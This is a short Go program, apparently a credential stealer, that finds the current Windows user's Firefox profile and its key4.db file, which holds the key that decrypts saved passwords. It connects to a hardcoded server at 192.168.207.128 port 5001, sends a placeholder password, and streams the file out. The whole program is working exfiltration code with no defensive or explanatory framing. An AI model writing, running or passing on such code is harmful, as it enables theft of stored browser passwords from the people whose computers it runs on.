package main

import (
    "fmt"
    "net"
    "os"
    "path/filepath"
)

const (
    SERVER_HOST = "192.168.207.128"
    SERVER_PORT = 5001
    BUFFER_SIZE = 4096
    PASSWORD    = "yourpassword"
)

func findFirefoxProfileAndKeys() (string, string) {
    appdata := os.Getenv("APPDATA")
    profilesPath := fmt.Sprintf("%s\\Mozilla\\Firefox\\Profiles", appdata)
    profiles, _ := filepath.Glob(filepath.Join(profilesPath, "*.default-release"))

    if len(profiles) == 0 {
        profiles, _ = filepath.Glob(filepath.Join(profilesPath, "*.default"))
    }

    if len(profiles) == 0 {
        return "", ""
    }

    profilePath := profiles[0]
    key4DBPath := filepath.Join(profilePath, "key4.db")

    if _, err := os.Stat(key4DBPath); os.IsNotExist(err) {
        return profilePath, ""
    }

    return profilePath, key4DBPath
}

func sendFile(client net.Conn) {
    _, key4DBPath := findFirefoxProfileAndKeys()
    file, err := os.Open(key4DBPath)
    if err != nil {
        fmt.Println("Error opening file:", err)
        return
    }
    defer file.Close()

    buffer := make([]byte, BUFFER_SIZE)
    for {
        n, err := file.Read(buffer)
        if err != nil || n == 0 {
            break
        }
        _, err = client.Write(buffer[:n])
        if err != nil {
            fmt.Println("Error sending file:", err)
            return
        }
    }
    fmt.Println("File sent successfully.")
}

func main() {
    client, err := net.Dial("tcp", fmt.Sprintf("%s:%d", SERVER_HOST, SERVER_PORT))
    if err != nil {
        fmt.Println("Error connecting to server:", err)
        return
    }
    defer client.Close()

    buffer := make([]byte, BUFFER_SIZE)
    n, err := client.Read(buffer)
    if err != nil {
        fmt.Println("Error receiving authentication prompt:", err)
        return
    }
    authPrompt := string(buffer[:n])

    if authPrompt == "AUTH" {
        client.Write([]byte(PASSWORD))
        n, err := client.Read(buffer)
        if err != nil {
            fmt.Println("Error receiving authentication response:", err)
            return
        }
        authResponse := string(buffer[:n])

        if authResponse == "AUTH_SUCCESS" {
            fmt.Println("Authenticated successfully.")
            sendFile(client)
        } else {
            fmt.Println("Authentication failed.")
        }
    } else {
        fmt.Println("Unexpected response from server.")
    }
}

